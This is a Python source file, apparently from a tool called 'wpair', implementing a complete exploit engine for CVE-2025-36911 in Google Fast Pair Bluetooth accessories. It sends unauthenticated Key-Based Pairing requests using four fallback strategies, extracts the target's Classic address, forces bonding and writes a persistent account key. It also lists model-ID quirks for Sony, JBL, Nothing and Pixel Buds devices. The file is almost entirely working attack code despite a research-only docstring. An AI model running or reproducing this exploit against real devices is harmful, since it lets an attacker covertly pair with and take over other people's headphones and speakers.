"""Fast Pair exploit engine for CVE-2025-36911."""

import asyncio
import logging
import secrets
from dataclasses import dataclass
from enum import Enum
from typing import Optional, Callable

from bleak import BleakClient
from wpair.crypto.ecdh import generate_ecdh_keypair
from wpair.crypto.aes import aes_encrypt_ecb, aes_decrypt_ecb
from wpair.bluetooth.classic_adapter import ClassicBluetoothAdapter
from wpair.utils.validators import validate_mac_address

logger = logging.getLogger(__name__)


class ExploitStrategy(Enum):
    """Exploit strategies tried in order until one succeeds."""
    RAW_KBP = "raw_kbp"                     # Raw unencrypted (most common)
    RAW_WITH_SEEKER = "raw_with_seeker"     # Raw with seeker address
    RETROACTIVE = "retroactive"             # With retroactive pairing flag
    EXTENDED_RESPONSE = "extended_response" # Request extended response


@dataclass
class ExploitResult:
    """Result of exploitation attempt."""
    success: bool
    br_edr_address: Optional[str] = None
    paired: bool = False
    account_key_written: bool = False
    message: str = ""


@dataclass
class DeviceQuirks:
    """Device-specific quirks for better compatibility."""
    needs_extended_response: bool = False
    prefers_br_edr_bonding: bool = True
    delay_before_kbp: float = 0.0
    delay_before_account_key: float = 0.5
    uses_retroactive_flag: bool = False
    skip_mtu_negotiation: bool = False


class FastPairExploit:
    """
    Fast Pair exploit for CVE-2025-36911 vulnerable devices.

    FOR SECURITY RESEARCH AND TESTING ON YOUR OWN DEVICES ONLY.

    This performs the complete Fast Pair pairing procedure on vulnerable
    devices that accept Key-Based Pairing requests without authentication.

    Features:
    - Multi-strategy exploit chain with automatic fallback
    - MTU negotiation for reliability
    - Robust response parsing with multiple strategies
    - Device-specific quirk handling
    """

    # Fast Pair UUIDs
    SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"
    MODEL_ID_UUID = "fe2c1233-8366-4814-8eb0-01de32100bea"
    KEY_BASED_PAIRING_UUID = "fe2c1234-8366-4814-8eb0-01de32100bea"
    PASSKEY_UUID = "fe2c1235-8366-4814-8eb0-01de32100bea"
    ACCOUNT_KEY_UUID = "fe2c1236-8366-4814-8eb0-01de32100bea"

    # Message types
    MSG_KEY_BASED_PAIRING_REQUEST = 0x00
    MSG_KEY_BASED_PAIRING_RESPONSE = 0x01

    # Timeouts
    CONNECTION_TIMEOUT = 10.0
    KBP_RESPONSE_TIMEOUT = 5.0
    PREFERRED_MTU = 83

    def __init__(self, classic_adapter: ClassicBluetoothAdapter):
        """
        Initialize exploit engine.

        Args:
            classic_adapter: Bluetooth Classic adapter for bonding
        """
        self.classic_adapter = classic_adapter
        self._is_running = False

        # Cryptographic state
        self.shared_secret: Optional[bytes] = None
        self.seeker_keypair: Optional[tuple] = None
        self.provider_br_edr_address: Optional[str] = None

        # Device quirks
        self.device_quirks = DeviceQuirks()
        self.model_id: Optional[bytes] = None

    async def exploit(
        self,
        target_address: str,
        on_progress: Optional[Callable[[str], None]] = None
    ) -> ExploitResult:
        """
        Attempt to exploit a vulnerable device.

        Args:
            target_address: BLE MAC address of target
            on_progress: Optional callback for progress updates

        Returns:
            ExploitResult with status and extracted data
        """
        if not validate_mac_address(target_address):
            return ExploitResult(success=False, message="Invalid MAC address")

        if self._is_running:
            return ExploitResult(success=False, message="Exploit already running")

        self._is_running = True
        self._reset_state()

        try:
            if on_progress:
                on_progress("Initializing exploit...")

            # Generate ECDH key pair
            if on_progress:
                on_progress("Generating ECDH key pair...")

            self.seeker_keypair = generate_ecdh_keypair()

            # Connect and perform exploitation
            async with BleakClient(target_address, timeout=self.CONNECTION_TIMEOUT) as client:

                if not client.is_connected:
                    return ExploitResult(success=False, message="Connection failed")

                if on_progress:
                    on_progress(f"Connected to {target_address}")

                # Request MTU
                try:
                    mtu = await client.request_mtu(self.PREFERRED_MTU)
                    logger.info(f"MTU: {mtu} bytes")
                except Exception as e:
                    logger.warning(f"MTU negotiation failed: {e}")

                # Discover services
                services = client.services
                fp_service = services.get_service(self.SERVICE_UUID)

                if fp_service is None:
                    return ExploitResult(success=False, message="Fast Pair service not found")

                # Read Model ID for device quirks
                model_char = fp_service.get_characteristic(self.MODEL_ID_UUID)
                if model_char:
                    try:
                        self.model_id = await client.read_gatt_char(model_char)
                        model_hex = self.model_id.hex().upper()
                        if on_progress:
                            on_progress(f"Model ID: {model_hex}")
                        self.device_quirks = self._get_device_quirks(self.model_id)
                    except Exception as e:
                        logger.warning(f"Failed to read Model ID: {e}")

                # Get KBP characteristic
                kbp_char = fp_service.get_characteristic(self.KEY_BASED_PAIRING_UUID)
                if kbp_char is None:
                    return ExploitResult(success=False, message="KBP characteristic not found")

                # Enable notifications
                if on_progress:
                    on_progress("Enabling notifications...")

                kbp_response_future = asyncio.Future()

                def notification_handler(sender, data: bytearray):
                    if not kbp_response_future.done():
                        kbp_response_future.set_result(bytes(data))

                await client.start_notify(kbp_char, notification_handler)

                # Try strategies until one works
                for strategy in ExploitStrategy:
                    if on_progress:
                        on_progress(f"Trying strategy: {strategy.value}")

                    # Apply device-specific delay
                    if self.device_quirks.delay_before_kbp > 0:
                        await asyncio.sleep(self.device_quirks.delay_before_kbp)

                    # Build and send KBP request
                    request = self._build_kbp_request(target_address, strategy)

                    try:
                        await client.write_gatt_char(kbp_char, request, response=True)

                        if on_progress:
                            on_progress(f"KBP ACCEPTED ({strategy.value})! Device is VULNERABLE!")

                        # Wait for response
                        try:
                            response_data = await asyncio.wait_for(
                                kbp_response_future,
                                timeout=self.KBP_RESPONSE_TIMEOUT
                            )

                            if on_progress:
                                on_progress(f"Response received ({len(response_data)} bytes)")

                            # Parse BR/EDR address
                            br_edr_address = self._parse_kbp_response(response_data)

                            if br_edr_address:
                                self.provider_br_edr_address = br_edr_address

                                if on_progress:
                                    on_progress(f"BR/EDR address: {br_edr_address}")

                                # Initiate bonding
                                if on_progress:
                                    on_progress("Initiating Bluetooth Classic bonding...")

                                bonding_success = await self._initiate_bonding(br_edr_address)

                                if bonding_success:
                                    # Write account key
                                    if on_progress:
                                        on_progress("Writing account key...")

                                    account_key_written = await self._write_account_key(client, fp_service)

                                    return ExploitResult(
                                        success=True,
                                        br_edr_address=br_edr_address,
                                        paired=True,
                                        account_key_written=account_key_written,
                                        message="Exploitation successful!"
                                    )
                                else:
                                    return ExploitResult(
                                        success=False,
                                        br_edr_address=br_edr_address,
                                        message="Bonding failed"
                                    )
                            else:
                                # Fallback to BLE address
                                if on_progress:
                                    on_progress("Could not parse BR/EDR, using BLE address...")

                                return ExploitResult(
                                    success=False,
                                    br_edr_address=target_address,
                                    message="BR/EDR address extraction failed"
                                )

                        except asyncio.TimeoutError:
                            if on_progress:
                                on_progress("No response received, trying next strategy...")
                            # Reset future for next strategy
                            kbp_response_future = asyncio.Future()
                            continue

                    except Exception as e:
                        # KBP rejected, try next strategy
                        logger.debug(f"Strategy {strategy.value} failed: {e}")
                        kbp_response_future = asyncio.Future()
                        continue

                # All strategies exhausted
                return ExploitResult(
                    success=False,
                    message="All exploit strategies exhausted - device may be patched"
                )

        except Exception as e:
            logger.error(f"Exploit failed: {e}")
            return ExploitResult(success=False, message=f"Exploit error: {e}")

        finally:
            self._is_running = False

    def _build_kbp_request(self, address: str, strategy: ExploitStrategy) -> bytes:
        """Build KBP request for given strategy."""
        address_bytes = bytes.fromhex(address.replace(":", ""))

        if strategy == ExploitStrategy.RAW_KBP:
            # Strategy 1: Minimal raw request (works on most vulnerable devices)
            salt = secrets.token_bytes(8)

            request = bytearray(16)
            request[0] = self.MSG_KEY_BASED_PAIRING_REQUEST  # 0x00
            request[1] = 0x11  # Flags: INITIATE_BONDING | EXTENDED_RESPONSE
            request[2:8] = address_bytes
            request[8:16] = salt

            # Store salt-based shared secret
            self.shared_secret = salt + b'\x00' * 8

            return bytes(request)

        elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
            # Strategy 2: Include seeker address explicitly
            salt = secrets.token_bytes(8)

            request = bytearray(16)
            request[0] = self.MSG_KEY_BASED_PAIRING_REQUEST
            request[1] = 0x10  # Flags: INITIATE_BONDING only
            request[2:8] = address_bytes
            request[8:16] = salt

            self.shared_secret = salt + b'\x00' * 8

            return bytes(request)

        elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
            # Strategy 3: Request extended response format
            salt = secrets.token_bytes(8)

            request = bytearray(16)
            request[0] = self.MSG_KEY_BASED_PAIRING_REQUEST
            request[1] = 0x01  # Flags: EXTENDED_RESPONSE only
            request[2:8] = address_bytes
            request[8:16] = salt

            self.shared_secret = salt + b'\x00' * 8

            return bytes(request)

        else:  # RETROACTIVE
            # Strategy 4: Use retroactive pairing flag
            salt = secrets.token_bytes(8)

            request = bytearray(16)
            request[0] = self.MSG_KEY_BASED_PAIRING_REQUEST
            request[1] = 0x90  # Flags: RETROACTIVE_PAIRING
            request[2:8] = address_bytes
            request[8:16] = salt

            self.shared_secret = salt + b'\x00' * 8

            return bytes(request)

    def _parse_kbp_response(self, data: bytes) -> Optional[str]:
        """
        Parse KBP response to extract BR/EDR MAC address.

        Tries multiple parsing strategies:
        1. Standard response format (type 0x01)
        2. Extended response format (type 0x02)
        3. Decrypt with shared secret
        4. Brute-force scan for valid MAC pattern
        """
        if len(data) < 7:
            return None

        # Try 1: Standard response (type 0x01)
        if data[0] == self.MSG_KEY_BASED_PAIRING_RESPONSE:
            addr = self._extract_address(data, 1)
            if self._is_valid_bluetooth_address(addr) and not self._is_null_address(addr):
                logger.info(f"Found BR/EDR address in standard format: {addr}")
                return addr

        # Try 2: Extended response (type 0x02)
        if data[0] == 0x02 and len(data) >= 9:
            addr_count = data[2]
            if addr_count >= 1:
                addr = self._extract_address(data, 3)
                if self._is_valid_bluetooth_address(addr) and not self._is_null_address(addr):
                    logger.info(f"Found BR/EDR address in extended format: {addr}")
                    return addr

        # Try 3: Decrypt with shared secret
        if self.shared_secret and len(data) >= 16:
            try:
                # Pad data to multiple of 16 if needed
                padded_data = data + b'\x00' * (16 - len(data) % 16) if len(data) % 16 != 0 else data
                decrypted = aes_decrypt_ecb(self.shared_secret[:16], padded_data[:16])
                if decrypted[0] == self.MSG_KEY_BASED_PAIRING_RESPONSE:
                    addr = self._extract_address(decrypted, 1)
                    if self._is_valid_bluetooth_address(addr) and not self._is_null_address(addr):
                        logger.info(f"Found BR/EDR address after decryption: {addr}")
                        return addr
            except Exception as e:
                logger.debug(f"Decryption failed: {e}")

        # Try 4: Brute force MAC scan
        for offset in range(len(data) - 5):
            addr = self._extract_address(data, offset)
            if self._is_valid_bluetooth_address(addr) and not self._is_null_address(addr):
                logger.info(f"Found MAC at offset {offset}: {addr}")
                return addr

        return None

    @staticmethod
    def _extract_address(data: bytes, offset: int) -> str:
        """Extract MAC address from byte array at given offset."""
        if offset + 6 > len(data):
            return "00:00:00:00:00:00"

        return ":".join(f"{b:02X}" for b in data[offset:offset+6])

    @staticmethod
    def _is_null_address(addr: str) -> bool:
        """Check if address is null/broadcast."""
        return addr in ("00:00:00:00:00:00", "FF:FF:FF:FF:FF:FF")

    @staticmethod
    def _is_valid_bluetooth_address(address: str) -> bool:
        """Validate Bluetooth MAC address format."""
        return validate_mac_address(address)

    async def _initiate_bonding(self, br_edr_address: str) -> bool:
        """Initiate Bluetooth Classic bonding."""
        try:
            return await self.classic_adapter.pair_device(br_edr_address)
        except Exception as e:
            logger.error(f"Bonding failed: {e}")
            return False

    async def _write_account_key(self, client: BleakClient, fp_service) -> bool:
        """Write Account Key to device for persistence."""
        account_key_char = fp_service.get_characteristic(self.ACCOUNT_KEY_UUID)

        if account_key_char is None:
            logger.error("Account Key characteristic not found")
            return False

        # Generate account key (starts with 0x04)
        account_key = bytearray(16)
        account_key[0] = 0x04
        account_key[1:] = secrets.token_bytes(15)

        # Encrypt with shared secret if available
        if self.shared_secret:
            data_to_write = aes_encrypt_ecb(self.shared_secret[:16], bytes(account_key))
        else:
            data_to_write = bytes(account_key)

        try:
            await asyncio.sleep(self.device_quirks.delay_before_account_key)
            await client.write_gatt_char(account_key_char, data_to_write, response=True)
            logger.info("Account key written successfully")
            return True
        except Exception as e:
            logger.error(f"Failed to write account key: {e}")
            return False

    def _get_device_quirks(self, model_id: bytes) -> DeviceQuirks:
        """Get device-specific quirks based on Model ID."""
        model_hex = model_id.hex().upper()

        # Sony devices
        if model_hex in ["CD8256", "0E30C3", "D5BC6B", "821F66"]:
            return DeviceQuirks(
                needs_extended_response=True,
                delay_before_account_key=1.0
            )

        # JBL devices
        if model_hex in ["F52494", "718FA4", "D446A7"]:
            return DeviceQuirks(delay_before_kbp=0.2)

        # Nothing devices
        if model_hex == "D0A72C":
            return DeviceQuirks(prefers_br_edr_bonding=False)

        # Google Pixel Buds
        if model_hex == "30018E":
            return DeviceQuirks(delay_before_account_key=0.5)

        return DeviceQuirks()

    def _reset_state(self):
        """Reset internal state for new exploit attempt."""
        self.shared_secret = None
        self.seeker_keypair = None
        self.provider_br_edr_address = None
        self.device_quirks = DeviceQuirks()
        self.model_id = None
